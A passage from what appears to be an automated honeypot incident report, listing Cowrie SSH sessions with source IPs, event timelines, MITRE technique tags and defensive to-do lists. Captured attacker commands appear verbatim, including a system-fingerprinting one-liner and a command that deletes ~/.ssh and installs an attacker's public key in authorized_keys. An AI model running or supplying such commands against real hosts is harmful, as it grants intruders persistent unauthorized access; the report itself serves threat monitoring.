| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:42:36` | `cowrie.session.connect` |
| `2026-07-26 03:42:36` | `cowrie.client.version` |
| `2026-07-26 03:42:36` | `cowrie.client.kex` |
| `2026-07-26 03:42:37` | `cowrie.login.success` |
| `2026-07-26 03:42:38` | `cowrie.session.params` |
| `2026-07-26 03:42:38` | `cowrie.command.input` |
| `2026-07-26 03:42:38` | `cowrie.command.input` |
| `2026-07-26 03:42:38` | `cowrie.command.input` |
| `2026-07-26 03:42:38` | `cowrie.command.input` |
| `2026-07-26 03:42:38` | `cowrie.command.input` |
| `2026-07-26 03:42:38` | `cowrie.command.success` |
| `2026-07-26 03:42:38` | `cowrie.command.input` |
| `2026-07-26 03:42:38` | `cowrie.command.input` |
| `2026-07-26 03:42:38` | `cowrie.command.input` |
| `2026-07-26 03:42:38` | `cowrie.command.input` |
| `2026-07-26 03:42:39` | `cowrie.log.closed` |
| `2026-07-26 03:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2006bc1c3b2f

| Field | Detail |
|---|---|
| **Source IP** | `96.1.40[.]151` |
| **First Seen** | 2026-07-26 03:43 |
| **Last Seen** | 2026-07-26 03:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:43:40` | `cowrie.session.connect` |
| `2026-07-26 03:43:40` | `cowrie.client.version` |
| `2026-07-26 03:43:40` | `cowrie.client.kex` |
| `2026-07-26 03:43:41` | `cowrie.login.success` |
| `2026-07-26 03:43:41` | `cowrie.direct-tcpip.request` |
| `2026-07-26 03:43:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.1.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `96.1.40[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9f20c6c5e9d

| Field | Detail |
|---|---|
| **Source IP** | `45.181.101[.]95` |
| **First Seen** | 2026-07-26 03:43 |
| **Last Seen** | 2026-07-26 03:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:43:46` | `cowrie.session.connect` |
| `2026-07-26 03:43:47` | `cowrie.client.version` |
| `2026-07-26 03:43:47` | `cowrie.client.kex` |
| `2026-07-26 03:43:50` | `cowrie.login.success` |
| `2026-07-26 03:43:50` | `cowrie.direct-tcpip.request` |
| `2026-07-26 03:43:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.181.101[.]95` to AbuseIPDB if not already reported
- [ ] Block `45.181.101[.]95` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dea24be4ce68

| Field | Detail |
|---|---|
| **Source IP** | `129.121.123[.]80` |
| **First Seen** | 2026-07-26 03:44 |
| **Last Seen** | 2026-07-26 03:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:44:13` | `cowrie.session.connect` |
| `2026-07-26 03:44:13` | `cowrie.client.version` |
| `2026-07-26 03:44:13` | `cowrie.client.kex` |
| `2026-07-26 03:44:13` | `cowrie.login.success` |
| `2026-07-26 03:44:14` | `cowrie.session.params` |
| `2026-07-26 03:44:14` | `cowrie.command.input` |
| `2026-07-26 03:44:14` | `cowrie.command.failed` |
| `2026-07-26 03:44:14` | `cowrie.log.closed` |
| `2026-07-26 03:44:14` | `cowrie.session.params` |
| `2026-07-26 03:44:14` | `cowrie.command.input` |
| `2026-07-26 03:44:14` | `cowrie.session.file_download` |
| `2026-07-26 03:44:14` | `cowrie.log.closed` |
| `2026-07-26 03:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.123[.]80` to AbuseIPDB if not already reported
- [ ] Block `129.121.123[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d55a827e79a

| Field | Detail |
|---|---|
| **Source IP** | `129.121.123[.]80` |
| **First Seen** | 2026-07-26 03:44 |
| **Last Seen** | 2026-07-26 03:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:44:14` | `cowrie.session.connect` |
| `2026-07-26 03:44:14` | `cowrie.client.version` |
| `2026-07-26 03:44:14` | `cowrie.client.kex` |
| `2026-07-26 03:44:14` | `cowrie.login.success` |
| `2026-07-26 03:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.123[.]80` to AbuseIPDB if not already reported
- [ ] Block `129.121.123[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99ef322cd2e6

| Field | Detail |
|---|---|
| **Source IP** | `129.121.123[.]80` |
| **First Seen** | 2026-07-26 03:44 |
| **Last Seen** | 2026-07-26 03:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:44:14` | `cowrie.session.connect` |
| `2026-07-26 03:44:14` | `cowrie.client.version` |
| `2026-07-26 03:44:14` | `cowrie.client.kex` |
| `2026-07-26 03:44:15` | `cowrie.login.success` |
| `2026-07-26 03:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.123[.]80` to AbuseIPDB if not already reported
- [ ] Block `129.121.123[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70bea1bfa697

| Field | Detail |
|---|---|
| **Source IP** | `57.128.239[.]181` |
| **First Seen** | 2026-07-26 03:44 |
| **Last Seen** | 2026-07-26 03:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:44:22` | `cowrie.session.connect` |
| `2026-07-26 03:44:22` | `cowrie.client.version` |
| `2026-07-26 03:44:22` | `cowrie.client.kex` |
| `2026-07-26 03:44:23` | `cowrie.login.success` |
| `2026-07-26 03:44:23` | `cowrie.session.params` |
| `2026-07-26 03:44:23` | `cowrie.command.input` |
| `2026-07-26 03:44:23` | `cowrie.command.failed` |
| `2026-07-26 03:44:24` | `cowrie.log.closed` |
| `2026-07-26 03:44:24` | `cowrie.session.params` |
| `2026-07-26 03:44:24` | `cowrie.command.input` |
| `2026-07-26 03:44:24` | `cowrie.session.file_download` |
| `2026-07-26 03:44:24` | `cowrie.log.closed` |
| `2026-07-26 03:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.128.239[.]181` to AbuseIPDB if not already reported
- [ ] Block `57.128.239[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d65e669dc0fd

| Field | Detail |
|---|---|
| **Source IP** | `57.128.239[.]181` |
| **First Seen** | 2026-07-26 03:44 |
| **Last Seen** | 2026-07-26 03:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:44:25` | `cowrie.session.connect` |
| `2026-07-26 03:44:25` | `cowrie.client.version` |
| `2026-07-26 03:44:25` | `cowrie.client.kex` |
| `2026-07-26 03:44:25` | `cowrie.login.success` |
| `2026-07-26 03:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.128.239[.]181` to AbuseIPDB if not already reported
- [ ] Block `57.128.239[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-901282b2a36c

| Field | Detail |
|---|---|
| **Source IP** | `57.128.239[.]181` |
| **First Seen** | 2026-07-26 03:44 |
| **Last Seen** | 2026-07-26 03:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:44:25` | `cowrie.session.connect` |
| `2026-07-26 03:44:25` | `cowrie.client.version` |
| `2026-07-26 03:44:26` | `cowrie.client.kex` |
| `2026-07-26 03:44:26` | `cowrie.login.success` |
| `2026-07-26 03:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.128.239[.]181` to AbuseIPDB if not already reported
- [ ] Block `57.128.239[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a85ff68ccda4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:46 |
| **Last Seen** | 2026-07-26 03:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:46:06` | `cowrie.session.connect` |
| `2026-07-26 03:46:06` | `cowrie.client.version` |
| `2026-07-26 03:46:06` | `cowrie.client.kex` |
| `2026-07-26 03:46:07` | `cowrie.login.success` |
| `2026-07-26 03:46:09` | `cowrie.session.params` |
| `2026-07-26 03:46:09` | `cowrie.command.input` |
| `2026-07-26 03:46:09` | `cowrie.command.input` |
| `2026-07-26 03:46:09` | `cowrie.command.input` |
| `2026-07-26 03:46:09` | `cowrie.command.input` |
| `2026-07-26 03:46:09` | `cowrie.command.input` |
| `2026-07-26 03:46:09` | `cowrie.command.success` |
| `2026-07-26 03:46:09` | `cowrie.command.input` |
| `2026-07-26 03:46:09` | `cowrie.command.input` |
| `2026-07-26 03:46:09` | `cowrie.command.input` |
| `2026-07-26 03:46:09` | `cowrie.command.input` |
| `2026-07-26 03:46:09` | `cowrie.log.closed` |
| `2026-07-26 03:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfd930b2352e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:47 |
| **Last Seen** | 2026-07-26 03:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:47:55` | `cowrie.session.connect` |
| `2026-07-26 03:47:55` | `cowrie.client.version` |
| `2026-07-26 03:47:55` | `cowrie.client.kex` |
| `2026-07-26 03:47:56` | `cowrie.login.success` |
| `2026-07-26 03:47:56` | `cowrie.session.params` |
| `2026-07-26 03:47:56` | `cowrie.command.input` |
| `2026-07-26 03:47:56` | `cowrie.command.input` |
| `2026-07-26 03:47:56` | `cowrie.command.input` |
| `2026-07-26 03:47:56` | `cowrie.command.input` |
| `2026-07-26 03:47:56` | `cowrie.command.input` |
| `2026-07-26 03:47:56` | `cowrie.command.success` |
| `2026-07-26 03:47:56` | `cowrie.command.input` |
| `2026-07-26 03:47:56` | `cowrie.command.input` |
| `2026-07-26 03:47:56` | `cowrie.command.input` |
| `2026-07-26 03:47:56` | `cowrie.command.input` |
| `2026-07-26 03:47:57` | `cowrie.log.closed` |
| `2026-07-26 03:47:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d6747685c80

| Field | Detail |
|---|---|
| **Source IP** | `117.222.2[.]246` |
| **First Seen** | 2026-07-26 03:48 |
| **Last Seen** | 2026-07-26 03:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:48:49` | `cowrie.session.connect` |
| `2026-07-26 03:48:50` | `cowrie.client.version` |
| `2026-07-26 03:48:50` | `cowrie.client.kex` |
| `2026-07-26 03:48:51` | `cowrie.login.success` |
| `2026-07-26 03:48:52` | `cowrie.direct-tcpip.request` |
| `2026-07-26 03:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.222.2[.]246` to AbuseIPDB if not already reported
- [ ] Block `117.222.2[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-361c78bed9f7

| Field | Detail |
|---|---|
| **Source IP** | `223.25.108[.]2` |
| **First Seen** | 2026-07-26 03:48 |
| **Last Seen** | 2026-07-26 03:49 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:48:58` | `cowrie.session.connect` |
| `2026-07-26 03:49:00` | `cowrie.client.version` |
| `2026-07-26 03:49:00` | `cowrie.client.kex` |
| `2026-07-26 03:49:03` | `cowrie.login.success` |
| `2026-07-26 03:49:04` | `cowrie.direct-tcpip.request` |
| `2026-07-26 03:49:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.25.108[.]2` to AbuseIPDB if not already reported
- [ ] Block `223.25.108[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-913e8f52fd06

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:49 |
| **Last Seen** | 2026-07-26 03:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:49:41` | `cowrie.session.connect` |
| `2026-07-26 03:49:41` | `cowrie.client.version` |
| `2026-07-26 03:49:41` | `cowrie.client.kex` |
| `2026-07-26 03:49:42` | `cowrie.login.success` |
| `2026-07-26 03:49:43` | `cowrie.session.params` |
| `2026-07-26 03:49:43` | `cowrie.command.input` |
| `2026-07-26 03:49:43` | `cowrie.command.input` |
| `2026-07-26 03:49:43` | `cowrie.command.input` |
| `2026-07-26 03:49:43` | `cowrie.command.input` |
| `2026-07-26 03:49:43` | `cowrie.command.input` |
| `2026-07-26 03:49:43` | `cowrie.command.success` |
| `2026-07-26 03:49:43` | `cowrie.command.input` |
| `2026-07-26 03:49:43` | `cowrie.command.input` |
| `2026-07-26 03:49:43` | `cowrie.command.input` |
| `2026-07-26 03:49:43` | `cowrie.command.input` |
| `2026-07-26 03:49:43` | `cowrie.log.closed` |
| `2026-07-26 03:49:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0e3ba7431a5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:51 |
| **Last Seen** | 2026-07-26 03:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:51:13` | `cowrie.session.connect` |
| `2026-07-26 03:51:14` | `cowrie.client.version` |
| `2026-07-26 03:51:14` | `cowrie.client.kex` |
| `2026-07-26 03:51:15` | `cowrie.login.success` |
| `2026-07-26 03:51:16` | `cowrie.session.params` |
| `2026-07-26 03:51:16` | `cowrie.command.input` |
| `2026-07-26 03:51:16` | `cowrie.command.input` |
| `2026-07-26 03:51:16` | `cowrie.command.input` |
| `2026-07-26 03:51:16` | `cowrie.command.input` |
| `2026-07-26 03:51:16` | `cowrie.command.input` |
| `2026-07-26 03:51:16` | `cowrie.command.success` |
| `2026-07-26 03:51:16` | `cowrie.command.input` |
| `2026-07-26 03:51:16` | `cowrie.command.input` |
| `2026-07-26 03:51:16` | `cowrie.command.input` |
| `2026-07-26 03:51:16` | `cowrie.command.input` |
| `2026-07-26 03:51:17` | `cowrie.log.closed` |
| `2026-07-26 03:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f0822215a74

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:52 |
| **Last Seen** | 2026-07-26 03:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:52:41` | `cowrie.session.connect` |
| `2026-07-26 03:52:42` | `cowrie.client.version` |
| `2026-07-26 03:52:42` | `cowrie.client.kex` |
| `2026-07-26 03:52:43` | `cowrie.login.success` |
| `2026-07-26 03:52:45` | `cowrie.session.params` |
| `2026-07-26 03:52:45` | `cowrie.command.input` |
| `2026-07-26 03:52:45` | `cowrie.command.input` |
| `2026-07-26 03:52:45` | `cowrie.command.input` |
| `2026-07-26 03:52:45` | `cowrie.command.input` |
| `2026-07-26 03:52:45` | `cowrie.command.input` |
| `2026-07-26 03:52:45` | `cowrie.command.success` |
| `2026-07-26 03:52:45` | `cowrie.command.input` |
| `2026-07-26 03:52:45` | `cowrie.command.input` |
| `2026-07-26 03:52:45` | `cowrie.command.input` |
| `2026-07-26 03:52:45` | `cowrie.command.input` |
| `2026-07-26 03:52:45` | `cowrie.log.closed` |
| `2026-07-26 03:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d92577ae36a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:54 |
| **Last Seen** | 2026-07-26 03:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:54:13` | `cowrie.session.connect` |
| `2026-07-26 03:54:14` | `cowrie.client.version` |
| `2026-07-26 03:54:14` | `cowrie.client.kex` |
| `2026-07-26 03:54:15` | `cowrie.login.success` |
| `2026-07-26 03:54:16` | `cowrie.session.params` |
| `2026-07-26 03:54:16` | `cowrie.command.input` |
| `2026-07-26 03:54:16` | `cowrie.command.input` |
| `2026-07-26 03:54:16` | `cowrie.command.input` |
| `2026-07-26 03:54:16` | `cowrie.command.input` |
| `2026-07-26 03:54:16` | `cowrie.command.input` |
| `2026-07-26 03:54:16` | `cowrie.command.success` |
